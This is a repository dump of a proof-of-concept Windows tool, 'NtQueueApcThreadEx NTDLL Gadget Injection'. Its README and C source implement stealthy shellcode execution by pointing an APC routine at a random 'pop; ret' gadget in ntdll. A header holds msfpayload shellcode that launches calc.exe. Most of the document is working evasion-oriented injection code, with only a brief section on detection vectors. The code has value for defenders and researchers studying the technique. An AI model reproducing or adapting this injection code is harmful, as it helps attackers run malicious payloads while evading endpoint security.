Project Path: arc_gmh5225_ntqueueapcthreadex-ntdll-gadget-injection_ow4gbjno

Source Tree:

```txt
arc_gmh5225_ntqueueapcthreadex-ntdll-gadget-injection_ow4gbjno
â”œâ”€â”€ LICENSE.txt
â”œâ”€â”€ README.md
â””â”€â”€ src
    â”œâ”€â”€ api.h
    â”œâ”€â”€ gadget.c
    â”œâ”€â”€ gadget.h
    â”œâ”€â”€ main.c
    â””â”€â”€ main.h

```

`LICENSE.txt`:

```txt
MIT License

Copyright (c) [year] [fullname]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# ðŸ§ª NtQueueApcThreadEx NTDLL Gadget Injection
## Introduction
This novel way of using `NtQueueApcThreadEx` by abusing the `ApcRoutine` and `SystemArgument[0-3]` parameters by passing a random `pop r32; ret` gadget can be used for stealthy code injection. Within this PoC, the gadget in this case is picked randomly from `ntdll.dll`'s memory region which matches a specific pattern. This means the gadget _returns into_ the shellcode.

1. Allocate shellcode in target process. For best results, this should be used with the [shellcode-plain-sight](https://github.com/LloydLabs/shellcode-plain-sight) project.
2. Find a random gadget in PE sections matching `IMAGE_SCN_CNT_CODE` and `IMAGE_SCN_MEM_EXECUTE` within `ntdll.dll` in memory.
3. Setup the `NtQueueApcThreadEx` call, `ApcRoutine` = gadget address chosen randomly, `SystemArgument` = pointer to shellcode
4. The `NtQueueApcThreadEx` will force the IP to the gadget `ntdll.dll!<random pop r32; ret>`, and return into `SystemArgument1`
5. âœ¨tadaâœ¨

There are hundreds gadgets which can be used inside `ntdll.dll` (from my build, at least) - making this tricky to detect. With the nature of the call, `SystemArgument1` is simply

Upon inspecting the call, unlike traditional APC injection, `ApcRoutine` will simply point to a legitimate address inside of `ntdll.dll`.

## Visualization

![Visualization of technique](https://i.imgur.com/IplH88H.jpeg)

## Possible Detection Vectors
This is likely a bit tricky to detect. Upon inspecting calls to `NtQueueApcThreadEx`, check if any of the arguments point towards executable memory. Another possible detection avenue is to check if `ApcRoutine` points towards an address inside `ntdll` - however this is likely to trigger a lot of false positives.

This technique was originally detailed in Avast's Raspberry Robin writeup [here](https://decoded.avast.io/janvojtesek/raspberry-robins-roshtyak-a-little-lesson-in-trickery/).
```

`src/api.h`:

```h
#pragma once

#include <Windows.h>

// https://processhacker.sourceforge.io/doc/ntpsapi_8h_source.html
typedef 
VOID
(*PPS_APC_ROUTINE)(
	_In_opt_ PVOID ApcArgument1,
	_In_opt_ PVOID ApcArgument2,
	_In_opt_ PVOID ApcArgument3
);


typedef
NTSTATUS
(*_NtQueueApcThreadEx)(
	_In_ HANDLE ThreadHandle,
	_In_opt_ HANDLE UserApcReserveHandle,
	_In_ PPS_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcArgument1,
	_In_opt_ PVOID ApcArgument2,
	_In_opt_ PVOID ApcArgument3
);

typedef
NTSTATUS
(*_NtTestAlert)(
	VOID
);
```

`src/gadget.c`:

```c
#include "gadget.h"

static
BOOL
gadget_match_valid(
    PBYTE pbAddress
)
{
    return (*pbAddress != 0x5C && (*pbAddress & (~0xF)) == 0x50) && *(pbAddress + 1) == 0xC3;
}

LPVOID
gadget_find_rand_pop_ret(
    HANDLE hProcess,
    LPCWSTR lpcszModule
)
{
    HMODULE hNtDLL = GetModuleHandle(lpcszModule);
    if (hNtDLL == NULL)
    {
        return NULL;
    }

    MODULEINFO ntMi;
    if (!GetModuleInformation(hProcess, hNtDLL, &ntMi, sizeof(ntMi)))
    {
        return NULL;
    }

    PIMAGE_DOS_HEADER pDOSHdr = (PIMAGE_DOS_HEADER)ntMi.lpBaseOfDll;
    if (pDOSHdr->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return NULL;
    }

    PIMAGE_NT_HEADERS pNTHdr = (PIMAGE_NT_HEADERS)((LPBYTE)ntMi.lpBaseOfDll + pDOSHdr->e_lfanew);
    if (pNTHdr->Signature != IMAGE_NT_SIGNATURE)
    {
        return NULL;
    }

    LPVOID lpaGadgets[MAX_GADGETS];
    RtlSecureZeroMemory(lpaGadgets, sizeof(lpaGadgets));

    DWORD dwGadgetCount = 0;
    for (WORD i = 0; i < pNTHdr->FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER pSectHdr = (PIMAGE_SECTION_HEADER)((PBYTE)IMAGE_FIRST_SECTION(pNTHdr) + (IMAGE_SIZEOF_SECTION_HEADER * i));

        if (
            (pSectHdr->Characteristics & IMAGE_SCN_CNT_CODE) == IMAGE_SCN_CNT_CODE &&
            (pSectHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE
            )
        {
            LPBYTE lpbSectionBase = (LPBYTE)ntMi.lpBaseOfDll + pSectHdr->VirtualAddress;
            LPBYTE lpbSectionEnd = (LPBYTE)lpbSectionBase + pSectHdr->Misc.VirtualSize;

            for (PBYTE lpbCurAddr = lpbSectionBase; lpbCurAddr < (lpbSectionEnd - 1); lpbCurAddr++)
            {
                if (!gadget_match_valid(lpbCurAddr))
                {
                    continue;
                }

                lpaGadgets[dwGadgetCount++] = lpbCurAddr;
                if (dwGadgetCount == MAX_GADGETS)
                {
                    break;
                }
            }
        }
    }

    return lpaGadgets[RANDOM_NUMB(0, dwGadgetCount)];
}

```

`src/gadget.h`:

```h
#pragma once

#include <Windows.h>
#include <psapi.h>

#define MAX_GADGETS 512
#define RANDOM_NUMB(min, max) (rand() % (max + 1 - min) + min)

LPVOID
gadget_find_rand_pop_ret(
    HANDLE hProcess,
    LPCWSTR lpcszModule
);
```

`src/main.c`:

```c
#pragma once

#include "main.h"
#include "api.h"
#include "gadget.h"

static _NtQueueApcThreadEx NtQueueApcThreadEx = NULL;
static _NtTestAlert NtTestAlert = NULL;

VOID
queue_alert_thread_with_gadget(
    HANDLE hThread,
    LPVOID lpGadget,
    PVOID lpShellcode
)
{
    /**
    * hThread -> target thread to queue APC thread in
    * PPS_APC_ROUTINE -> random (pop r32; ret) gadget we found in target DLL space
    * ApcArgument1 -> pointer of shellcode to return into from gadget
    **/
    if (NT_SUCCESS(NtQueueApcThreadEx(hThread, NULL, (PPS_APC_ROUTINE)lpGadget, lpShellcode, NULL, NULL) == ERROR_SUCCESS))
    {
        NtTestAlert();
    }
}

BOOL 
init_apis(
    VOID
)
{
    HMODULE hNt = GetModuleHandle(L"ntdll.dll");
    if (hNt == NULL)
    {
        return FALSE;
    }

    // NtQueueApcThreadEx is Windows 7+
    NtQueueApcThreadEx = (_NtQueueApcThreadEx)GetProcAddress(hNt, "NtQueueApcThreadEx");
    if (NtQueueApcThreadEx == NULL)
    {
        return FALSE;
    }

    NtTestAlert = (_NtTestAlert)GetProcAddress(hNt, "NtTestAlert");
    if (NtQueueApcThreadEx == NULL)
    {
        return FALSE;
    }

    return TRUE;
}

INT 
main(
    int argc, 
    char** argv
)
{
    if (!init_apis())
    {
        printf("[>] Failed to resolve APIs successfully, NtQueueApcThreadEx may not be present in NTDLL (Win7+)\n");
        return 0;
    }

    BYTE bTestCalcPayload[] = TEST_X86_CALC_EXEC_SC;
    LPVOID lpShellcode = VirtualAlloc(NULL, sizeof(bTestCalcPayload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpShellcode == NULL)
    {
        printf("[>] Failed to allocate PAGE_EXECUTE_READWRITE memory for (n = %d)\n", sizeof(bTestCalcPayload));
        return 0;
    }

    printf("[>] Allocated space for sample shellcode at %p, copying..\n", lpShellcode);
    RtlCopyMemory(lpShellcode, bTestCalcPayload, sizeof(TEST_X86_CALC_EXEC_SC));

    // In this example, we'll find a pop r32; ret gadget within kernel32
    LPCWSTR lpcszTarget = L"ntdll.dll";
   
    LPVOID lpRandomGadget = gadget_find_rand_pop_ret(GetCurrentProcess(), lpcszTarget);
    if (lpRandomGadget == NULL)
    {
        printf("[>] Failed to find valid pop r32; ret gadget. Is this process 32-bit?\n");
        return 0;
    }

    wprintf(
        L"[>] Found usable gadget at location %ls!%p\n"
        L"[>] Calling NtQueueApcThreadEx(ApcRoutine = %p, SystemArgument1 = %p)\n",
        lpcszTarget, 
        lpRandomGadget, 
        lpRandomGadget,
        lpShellcode
    );

    queue_alert_thread_with_gadget(GetCurrentThread(), lpRandomGadget, lpShellcode);

    printf("[>] Freeing up the memory at %p\n", lpShellcode);
    VirtualFree(lpShellcode, 0, MEM_RELEASE);
    return 1;
}

```

`src/main.h`:

```h
#pragma once

#include <Windows.h>
#include <Winternl.h>
#include <psapi.h>
#include <stdio.h>

/**
* Source: msfpayload windows/exec CMD=calc.exe
**/
#define TEST_X86_CALC_EXEC_SC "\xd9\xec\xd9\x74\x24\xf4\xb8\x28\x1f\x44\xde\x5b\x31\xc9\xb1" \
	"\x33\x31\x43\x17\x83\xeb\xfc\x03\x6b\x0c\xa6\x2b\x97\xda\xaf" \
	"\xd4\x67\x1b\xd0\x5d\x82\x2a\xc2\x3a\xc7\x1f\xd2\x49\x85\x93" \
	"\x99\x1c\x3d\x27\xef\x88\x32\x80\x5a\xef\x7d\x11\x6b\x2f\xd1" \
	"\xd1\xed\xd3\x2b\x06\xce\xea\xe4\x5b\x0f\x2a\x18\x93\x5d\xe3" \
	"\x57\x06\x72\x80\x25\x9b\x73\x46\x22\xa3\x0b\xe3\xf4\x50\xa6" \
	"\xea\x24\xc8\xbd\xa5\xdc\x62\x99\x15\xdd\xa7\xf9\x6a\x94\xcc" \
	"\xca\x19\x27\x05\x03\xe1\x16\x69\xc8\xdc\x97\x64\x10\x18\x1f" \
	"\x97\x67\x52\x5c\x2a\x70\xa1\x1f\xf0\xf5\x34\x87\x73\xad\x9c" \
	"\x36\x57\x28\x56\x34\x1c\x3e\x30\x58\xa3\x93\x4a\x64\x28\x12" \
	"\x9d\xed\x6a\x31\x39\xb6\x29\x58\x18\x12\x9f\x65\x7a\xfa\x40" \
	"\xc0\xf0\xe8\x95\x72\x5b\x66\x6b\xf6\xe1\xcf\x6b\x08\xea\x7f" \
	"\x04\x39\x61\x10\x53\xc6\xa0\x55\xab\x8c\xe9\xff\x24\x49\x78" \
	"\x42\x29\x6a\x56\x80\x54\xe9\x53\x78\xa3\xf1\x11\x7d\xef\xb5" \
	"\xca\x0f\x60\x50\xed\xbc\x81\x71\x8e\x23\x12\x19\x7f\xc6\x92" \
	"\xb8\x7f"
```